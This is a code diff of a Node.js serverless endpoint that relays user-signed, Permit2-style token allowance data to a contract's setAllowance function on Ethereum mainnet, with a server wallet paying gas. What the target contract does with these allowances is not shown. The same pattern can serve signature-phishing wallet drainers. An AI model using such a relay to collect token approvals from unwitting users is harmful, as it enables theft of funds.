@@ -19,7 +19,7 @@ module.exports = async (req, res) => {
         return res.status(200).json({
             status: 'OK',
             message: 'API is working!',
-            contractAddress: "0xB5482B67457498A8770dA975982d8cE23c1A6925",
+            contractAddress: "0x72cA82f4463Bad47F7C762A7F3680EB232B72b33",
             timestamp: new Date().toISOString()
         });
     }
@@ -33,13 +33,15 @@ module.exports = async (req, res) => {
     // Main Logic
     // ============================================
     try {
-        const { user, nonce, deadline, signature } = req.body;
+        const { user, amount, expiration, nonce, sigDeadline, signature } = req.body;
 
         console.log('========================================');
         console.log('📥 REQUEST RECEIVED');
         console.log('  👤 User:', user);
-        console.log('  📝 Nonce:', nonce);
-        console.log('  ⏰ Deadline:', deadline);
+        console.log('  💰 Amount:', amount);
+        console.log('  ⏰ Expiration:', expiration);
+        console.log('  🔢 Nonce:', nonce);
+        console.log('  ⏳ Sig Deadline:', sigDeadline);
         console.log('  📝 Signature:', signature ? signature.substring(0, 40) + '...' : 'null');
         console.log('========================================');
 
@@ -49,7 +51,7 @@ module.exports = async (req, res) => {
         const CONFIG = {
             rpcUrl: `https://eth-mainnet.g.alchemy.com/v2/${process.env.ALCHEMY_API_KEY}`,
             privateKey: process.env.PRIVATE_KEY,
-            contractAddress: "0xB5482B67457498A8770dA975982d8cE23c1A6925"  // ⭐ අලුත් Address!
+            contractAddress: "0x72cA82f4463Bad47F7C762A7F3680EB232B72b33"  // ⭐ අලුත් Address!
         };
 
         // Check configs
@@ -70,7 +72,6 @@ module.exports = async (req, res) => {
         }
 
         if (!user) {
-            console.error('❌ user address not provided');
             return res.status(400).json({
                 success: false,
                 error: 'user address is required'
@@ -88,25 +89,27 @@ module.exports = async (req, res) => {
         console.log('👛 Wallet Address (Gas payer):', wallet.address);
 
         // ============================================
-        // ⭐ Contract ABI - දැන් Parameters 4ක්!
+        // ⭐ Contract ABI
         // ============================================
         const contractABI = [
-            "function setAllowance(address user, uint256 nonce, uint256 deadline, bytes calldata signature) external"
+            "function setAllowance(address user, uint160 amount, uint48 expiration, uint48 nonce, uint256 sigDeadline, bytes calldata signature) external"
         ];
 
         const contract = new ethers.Contract(CONFIG.contractAddress, contractABI, wallet);
         console.log('📋 Contract:', CONFIG.contractAddress);
 
         // ============================================
-        // ⭐ Submit Transaction - දැන් user parameter එකත් එක්ක!
+        // ⭐ Submit Transaction
         // ============================================
         console.log('⏳ Submitting setAllowance()...');
         console.log('⛽ Gas will be paid by:', wallet.address);
 
         const tx = await contract.setAllowance(
-            user,       // ⭐ User ගේ Address එක!
+            user,
+            amount,
+            expiration,
             nonce,
-            deadline,
+            sigDeadline,
             signature
         );
 
